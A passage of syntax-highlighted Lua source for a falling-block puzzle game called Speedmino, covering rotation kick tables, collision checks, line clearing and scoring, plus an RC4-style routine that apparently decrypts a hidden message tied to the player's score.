class="number">2</span>,<span class="number">2</span>&#125;&#125;,</span><br><span class="line">    &#123;[<span class="number">0</span>]=&#123;<span class="number">1.5</span>,<span class="number">1.5</span>&#125;,&#123;<span class="number">1.5</span>,<span class="number">1.5</span>&#125;,&#123;<span class="number">1.5</span>,<span class="number">1.5</span>&#125;,&#123;<span class="number">1.5</span>,<span class="number">1.5</span>&#125;&#125;,</span><br><span class="line">    &#123;[<span class="number">0</span>]=&#123;<span class="number">2.5</span>,<span class="number">0.5</span>&#125;,&#123;<span class="number">0.5</span>,<span class="number">2.5</span>&#125;,&#123;<span class="number">2.5</span>,<span class="number">1.5</span>&#125;,&#123;<span class="number">1.5</span>,<span class="number">2.5</span>&#125;&#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">local</span> srs=&#123;</span><br><span class="line">    [<span class="number">1</span>]=&#123;</span><br><span class="line">        [<span class="number">01</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">-2</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">-2</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">10</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">1</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">2</span>&#125;,&#123;<span class="number">1</span>,<span class="number">2</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">03</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">1</span>,<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">-2</span>&#125;,&#123;<span class="number">1</span>,<span class="number">-2</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">30</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">2</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">2</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">12</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">1</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">2</span>&#125;,&#123;<span class="number">1</span>,<span class="number">2</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">21</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">-2</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">-2</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">32</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">2</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">2</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">23</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">1</span>,<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">-2</span>&#125;,&#123;<span class="number">1</span>,<span class="number">-2</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">02</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">20</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">13</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">31</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    [<span class="number">6</span>]=&#123;</span><br><span class="line">        [<span class="number">01</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">10</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">12</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">21</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">23</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">32</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">30</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">03</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">02</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">20</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">13</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">31</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    [<span class="number">7</span>]=&#123;</span><br><span class="line">        [<span class="number">01</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-2</span>,<span class="number">0</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-2</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">1</span>,<span class="number">2</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">10</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">2</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">2</span>,<span class="number">1</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">-2</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">12</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">2</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">2</span>&#125;,&#123;<span class="number">2</span>,<span class="number">-1</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">21</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-2</span>,<span class="number">0</span>&#125;,&#123;<span class="number">1</span>,<span class="number">-2</span>&#125;,&#123;<span class="number">-2</span>,<span class="number">1</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">23</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">2</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">2</span>,<span class="number">1</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">-2</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">32</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-2</span>,<span class="number">0</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-2</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">1</span>,<span class="number">2</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">30</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-2</span>,<span class="number">0</span>&#125;,&#123;<span class="number">1</span>,<span class="number">-2</span>&#125;,&#123;<span class="number">-2</span>,<span class="number">1</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">03</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">2</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">2</span>&#125;,&#123;<span class="number">2</span>,<span class="number">-1</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">02</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">20</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">13</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">        [<span class="number">31</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i=<span class="number">2</span>,<span class="number">5</span> <span class="keyword">do</span> srs[i]=srs[<span class="number">1</span>] <span class="keyword">end</span></span><br><span class="line"><span class="keyword">local</span> colors=&#123;</span><br><span class="line">    COLOR.lR,</span><br><span class="line">    COLOR.lG,</span><br><span class="line">    COLOR.lB,</span><br><span class="line">    COLOR.lO,</span><br><span class="line">    COLOR.lM,</span><br><span class="line">    COLOR.lY,</span><br><span class="line">    COLOR.lC,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">local</span> keyState</span><br><span class="line"><span class="keyword">local</span> field</span><br><span class="line"><span class="keyword">local</span> nextQueue,holdSlot</span><br><span class="line"><span class="keyword">local</span> hand</span><br><span class="line"><span class="keyword">local</span> handX,handY</span><br><span class="line"><span class="keyword">local</span> dir,center</span><br><span class="line"><span class="keyword">local</span> dropTimer,lockTimer=dropDelay,lockDelay</span><br><span class="line"><span class="keyword">local</span> ghostY</span><br><span class="line"><span class="keyword">local</span> moveDir,moveCharge</span><br><span class="line"><span class="keyword">local</span> <span class="built_in">time</span>,line,b2b,combo,speedcombo,speedcombotime,score,scoreBuffer,multi,multiGauge,lastSpike,lastAttack</span><br><span class="line"><span class="keyword">local</span> lastSpikeTime,lastSpikeEndTime,lastAttackTime</span><br><span class="line"><span class="keyword">local</span> playing</span><br><span class="line"><span class="keyword">local</span> bindingKey=<span class="literal">false</span></span><br><span class="line"><span class="keyword">local</span> secretBox</span><br><span class="line"><span class="keyword">local</span> youwillget,trymore,scoremore</span><br><span class="line"><span class="keyword">local</span> multiColorTable = &#123;</span><br><span class="line">    [<span class="number">0</span>] = &#123;<span class="number">1.0</span>,<span class="number">1.0</span>,<span class="number">1.0</span>,<span class="number">0.5</span>&#125; ,</span><br><span class="line">    &#123;<span class="number">1.0</span>,<span class="number">0.0</span>,<span class="number">0.0</span>,<span class="number">0.626</span>&#125; ,</span><br><span class="line">    &#123;<span class="number">1.0</span>,<span class="number">0.5</span>,<span class="number">0.0</span>,<span class="number">0.626</span>&#125; ,</span><br><span class="line">    &#123;<span class="number">1.0</span>,<span class="number">1.0</span>,<span class="number">0.0</span>,<span class="number">0.626</span>&#125; ,</span><br><span class="line">    &#123;<span class="number">0.5</span>,<span class="number">1.0</span>,<span class="number">0.0</span>,<span class="number">0.626</span>&#125; ,</span><br><span class="line">    &#123;<span class="number">0.0</span>,<span class="number">1.0</span>,<span class="number">0.0</span>,<span class="number">0.626</span>&#125; ,</span><br><span class="line">    &#123;<span class="number">0.0</span>,<span class="number">1.0</span>,<span class="number">0.5</span>,<span class="number">0.626</span>&#125; ,</span><br><span class="line">    &#123;<span class="number">0.0</span>,<span class="number">1.0</span>,<span class="number">1.0</span>,<span class="number">0.626</span>&#125; ,</span><br><span class="line">    &#123;<span class="number">0.0</span>,<span class="number">0.5</span>,<span class="number">1.0</span>,<span class="number">0.626</span>&#125; ,</span><br><span class="line">    &#123;<span class="number">0.0</span>,<span class="number">0.0</span>,<span class="number">1.0</span>,<span class="number">0.626</span>&#125; ,</span><br><span class="line">    &#123;<span class="number">0.5</span>,<span class="number">0.0</span>,<span class="number">1.0</span>,<span class="number">0.626</span>&#125; ,</span><br><span class="line">    &#123;<span class="number">1.0</span>,<span class="number">0.0</span>,<span class="number">1.0</span>,<span class="number">0.626</span>&#125; ,</span><br><span class="line">    &#123;<span class="number">1.0</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.626</span>&#125; ,</span><br><span class="line">    &#123;<span class="number">1.0</span>,<span class="number">1.0</span>,<span class="number">1.0</span>,<span class="number">0.626</span>&#125; ,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">KSA</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> key = <span class="string">&quot;Speedmino Created By MrZ and modified by zxc&quot;</span></span><br><span class="line">    <span class="keyword">local</span> key_len = #key</span><br><span class="line">    <span class="keyword">local</span> S = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">0</span>, <span class="number">255</span> <span class="keyword">do</span></span><br><span class="line">        S[i] = i</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">0</span>, <span class="number">255</span> <span class="keyword">do</span></span><br><span class="line">        j = (j + S[i] + <span class="built_in">string</span>.<span class="built_in">byte</span>(key, i % key_len +<span class="number">1</span> , i % key_len +<span class="number">1</span>)) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> secret_i = <span class="number">0</span></span><br><span class="line"><span class="keyword">local</span> secret_j = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">tableToStr</span><span class="params">(text)</span></span></span><br><span class="line">    <span class="keyword">local</span> text_len = text[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">local</span> outstring = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">local</span> c</span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span>, text_len <span class="keyword">do</span></span><br><span class="line">        c = text[i]</span><br><span class="line">        <span class="keyword">if</span> c &lt; <span class="number">32</span> <span class="keyword">or</span> c &gt;= <span class="number">127</span> <span class="keyword">then</span></span><br><span class="line">            outstring = outstring .. <span class="string">&quot;#&quot;</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            outstring = outstring .. <span class="built_in">string</span>.<span class="built_in">char</span>(c)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> outstring</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">calcData</span><span class="params">(text_table)</span></span></span><br><span class="line">    <span class="keyword">local</span> K = &#123;&#125;</span><br><span class="line">    <span class="keyword">local</span> text_len = text_table[<span class="number">0</span>]</span><br><span class="line">    K[<span class="number">0</span>] = text_len</span><br><span class="line">    <span class="keyword">for</span> n = <span class="number">1</span>, text_len <span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">        secret_i = (secret_i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        secret_j = (secret_j + secretBox[secret_i]) % <span class="number">256</span></span><br><span class="line"></span><br><span class="line">        secretBox[secret_i], secretBox[secret_j] = secretBox[secret_j], secretBox[secret_i]</span><br><span class="line">        K[n] = (text_table[n] + secretBox[(secretBox[secret_i] + secretBox[secret_j]) % <span class="number">256</span>]) % <span class="number">256</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> K</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">testPos</span><span class="params">(p,x,y)</span></span></span><br><span class="line">    <span class="keyword">if</span> x&lt;<span class="number">1</span> <span class="keyword">or</span> x+#p[<span class="number">1</span>]&gt;<span class="number">11</span> <span class="keyword">or</span> y&lt;<span class="number">1</span> <span class="keyword">then</span> <span class="keyword">return</span> <span class="literal">false</span> <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">for</span> _y=<span class="number">1</span>,#p <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">for</span> _x=<span class="number">1</span>,#p[<span class="number">1</span>] <span class="keyword">do</span></span><br><span class="line">            <span class="keyword">if</span> p[_y][_x] <span class="keyword">and</span> field[y+_y<span class="number">-1</span>][x+_x<span class="number">-1</span>] <span class="keyword">then</span> <span class="keyword">return</span> <span class="literal">false</span> <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">freshGhost</span><span class="params">()</span></span></span><br><span class="line">    ghostY=handY</span><br><span class="line">    <span class="keyword">while</span> testPos(hand, handX, ghostY<span class="number">-1</span>) <span class="keyword">do</span></span><br><span class="line">        ghostY=ghostY<span class="number">-1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    lockTimer=lockDelay</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">supplyNext</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">if</span> #nextQueue&gt;=<span class="number">6</span> <span class="keyword">then</span> <span class="keyword">return</span> <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> l=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>&#125;</span><br><span class="line">    TABLE.shuffle(l)</span><br><span class="line">    <span class="keyword">for</span> i=<span class="number">1</span>,#l <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">local</span> newPiece=TABLE.copy(pieceList[l[i]])</span><br><span class="line">        newPiece.id=l[i]</span><br><span class="line">        <span class="built_in">table</span>.<span class="built_in">insert</span>(nextQueue, newPiece)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">freshPiecePos</span><span class="params">()</span></span></span><br><span class="line">    handY=<span class="number">21</span></span><br><span class="line">    handX=<span class="built_in">math</span>.<span class="built_in">floor</span>(<span class="number">6</span>-#hand[<span class="number">1</span>]/<span class="number">2</span>)</span><br><span class="line">    dropTimer,lockTimer=dropDelay,lockDelay</span><br><span class="line">    dir=<span class="number">0</span></span><br><span class="line">    center=centerList[hand.id][dir]</span><br><span class="line">    freshGhost()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> testPos(hand, handX, handY) <span class="keyword">then</span></span><br><span class="line">        playing=<span class="literal">false</span></span><br><span class="line">        <span class="keyword">if</span> trymore &gt;= <span class="number">2600</span> <span class="keyword">then</span></span><br><span class="line">            SFX.play(<span class="string">&#x27;win&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            SFX.play(<span class="string">&#x27;fail&#x27;</span>)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">popNext</span><span class="params">()</span></span></span><br><span class="line">    hand=<span class="built_in">table</span>.<span class="built_in">remove</span>(nextQueue, <span class="number">1</span>)</span><br><span class="line">    freshPiecePos()</span><br><span class="line">    <span class="keyword">if</span> #nextQueue&lt;<span class="number">7</span> <span class="keyword">then</span> supplyNext() <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">rotate</span><span class="params">(rotDir)</span></span></span><br><span class="line">    <span class="keyword">local</span> newHand=TABLE.rotate(hand, rotDir); newHand.id=hand.id</span><br><span class="line">    <span class="keyword">local</span> newDir=(dir+(rotDir==<span class="string">&#x27;R&#x27;</span> <span class="keyword">and</span> <span class="number">1</span> <span class="keyword">or</span> rotDir==<span class="string">&#x27;L&#x27;</span> <span class="keyword">and</span> <span class="number">-1</span> <span class="keyword">or</span> <span class="number">2</span>))%<span class="number">4</span></span><br><span class="line">    <span class="keyword">local</span> newX=handX+center[<span class="number">1</span>]-centerList[hand.id][newDir][<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">local</span> newY=handY+center[<span class="number">2</span>]-centerList[hand.id][newDir][<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">local</span> list=srs[hand.id][dir*<span class="number">10</span>+newDir]</span><br><span class="line">    <span class="keyword">local</span> success=<span class="literal">false</span></span><br><span class="line">    <span class="keyword">for</span> i=<span class="number">1</span>,#list <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> testPos(newHand, newX+list[i][<span class="number">1</span>], newY+list[i][<span class="number">2</span>]) <span class="keyword">then</span></span><br><span class="line">            success=<span class="literal">true</span></span><br><span class="line">            hand=newHand</span><br><span class="line">            handX,handY=newX+list[i][<span class="number">1</span>],newY+list[i][<span class="number">2</span>]</span><br><span class="line">            dir,center=newDir,centerList[hand.id][newDir]</span><br><span class="line">            freshGhost()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span></span><br><span class="line">            <span class="keyword">not</span> (</span><br><span class="line">                testPos(hand, handX, handY+<span class="number">1</span>) <span class="keyword">or</span></span><br><span class="line">                testPos(hand, handX, handY<span class="number">-1</span>) <span class="keyword">or</span></span><br><span class="line">                testPos(hand, handX+<span class="number">1</span>, handY) <span class="keyword">or</span></span><br><span class="line">                testPos(hand, handX<span class="number">-1</span>, handY)</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            SFX.play(<span class="string">&#x27;rotatekick&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            SFX.play(<span class="string">&#x27;rotate&#x27;</span>)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">dropPiece</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">if</span> handY~=ghostY <span class="keyword">then</span></span><br><span class="line">        SFX.play(<span class="string">&#x27;drop&#x27;</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    handY=ghostY</span><br><span class="line">    <span class="keyword">local</span> spin=<span class="keyword">not</span> (</span><br><span class="line">        testPos(hand, handX, handY+<span class="number">1</span>) <span class="keyword">or</span></span><br><span class="line">        testPos(hand, handX, handY<span class="number">-1</span>) <span class="keyword">or</span></span><br><span class="line">        testPos(hand, handX+<span class="number">1</span>, handY) <span class="keyword">or</span></span><br><span class="line">        testPos(hand, handX<span class="number">-1</span>, handY)</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">for</span> _y=<span class="number">1</span>,#hand <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">for</span> _x=<span class="number">1</span>,#hand[<span class="number">1</span>] <span class="keyword">do</span></span><br><span class="line">            <span class="keyword">if</span> hand[_y][_x] <span class="keyword">then</span></span><br><span class="line">                field[handY+_y<span class="number">-1</span>][handX+_x<span class="number">-1</span>]=hand[_y][_x]</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> cnt=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> y=#field,<span class="number">1</span>,<span class="number">-1</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> TABLE.count(field[y], <span class="literal">false</span>)==<span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">table</span>.<span class="built_in">remove</span>(field, y)</span><br><span class="line">            <span class="built_in">table</span>.<span class="built_in">insert</span>(field, TABLE.new(<span class="literal">false</span>, <span class="number">10</span>))</span><br><span class="line">            cnt=cnt+<span class="number">1</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> cnt&gt;<span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">local</span> tempb2b = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> spin <span class="keyword">then</span> SFX.play(<span class="string">&#x27;spin_&#x27;</span>..<span class="built_in">math</span>.<span class="built_in">min</span>(cnt, <span class="number">4</span>)) <span class="keyword">end</span></span><br><span class="line">        SFX.play(<span class="string">&#x27;clear_&#x27;</span>..<span class="built_in">math</span>.<span class="built_in">min</span>(cnt, <span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">        line=line+cnt</span><br><span class="line">        <span class="keyword">if</span> spin <span class="keyword">or</span> cnt &gt;= <span class="number">4</span> <span class="keyword">then</span> b2b = b2b + <span class="number">1</span> <span class="keyword">else</span> tempb2b = b2b;b2b = <span class="number">-1</span> <span class="keyword">end</span></span><br><span class="line">        combo = combo + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> speedcombotime &gt;= <span class="built_in">time</span> <span class="keyword">then</span></span><br><span class="line">            speedcombo = speedcombo + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            speedcombotime = <span class="built_in">time</span></span><br><span class="line">            speedcombo = <span class="number">1</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        speedcombotime = speedcombotime + (cnt + <span class="number">2</span>) / (<span class="number">0.75</span> + (speedcombo *<span class="number">0.5</span>) ^ <span class="number">2</span>) + <span class="number">0.1</span></span><br><span class="line">        SFX.play(<span class="string">&#x27;ren_&#x27;</span>..<span class="built_in">math</span>.<span class="built_in">min</span>(<span class="built_in">math</span>.<span class="built_in">max</span>(combo - <span class="number">1</span>, speedcombo - <span class="number">2</span>,<span class="number">0</span>),<span class="number">11</span>))</span><br><span class="line">        <span class="keyword">local</span> attack = <span class="number">0</span></span><br><span class="line">        multiGauge = multiGauge + cnt + <span class="number">0.1</span></span><br><span class="line">        attack = attack + cnt - <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> spin <span class="keyword">or</span> cnt &gt;= <span class="number">4</span> <span class="keyword">then</span> </span><br><span class="line">            attack = attack + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> spin <span class="keyword">then</span></span><br><span class="line">                attack = attack + <span class="number">1</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">if</span> b2b &gt;= <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">                attack = attack + <span class="number">1</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        attack = attack + ((speedcombo + combo * <span class="number">2</span>) ^ <span class="number">0.5</span> ) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> TABLE.count(field[<span class="number">1</span>], <span class="literal">false</span>)==<span class="number">10</span> <span class="keyword">then</span></span><br><span class="line">            SFX.play(<span class="string">&#x27;pc&#x27;</span>)</span><br><span class="line">            attack = attack * <span class="number">1.5</span> + <span class="number">4</span></span><br><span class="line">            <span class="keyword">if</span> tempb2b &gt; <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">                b2b = tempb2b</span><br><span class="line">                tempb2b = <span class="number">0</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">            b2b = b2b + <span class="number">4</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> tempb2b &gt;= <span class="number">4</span> <span class="keyword">then</span></span><br><span class="line">            multiGauge = multiGauge + tempb2b * <span class="number">0.5</span></span><br><span class="line">            attack = attack + tempb2b</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        multiGauge = multiGauge + attack</span><br><span class="line">        <span class="keyword">while</span> multiGauge &gt;= multi * <span class="number">3</span> <span class="keyword">do</span></span><br><span class="line">            multiGauge = multiGauge - multi * <span class="number">3</span></span><br><span class="line">            multi = multi + <span class="number">1</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        scoreBuffer = scoreBuffer + attack * multi *<span class="number">0.25</span> * <span class="number">2</span> + <span class="number">1</span></span><br><span class="line">        lastSpike = lastSpike + attack</span><br><span class="line">        <span class="keyword">if</span> attack &gt;= <span class="number">1</span> <span 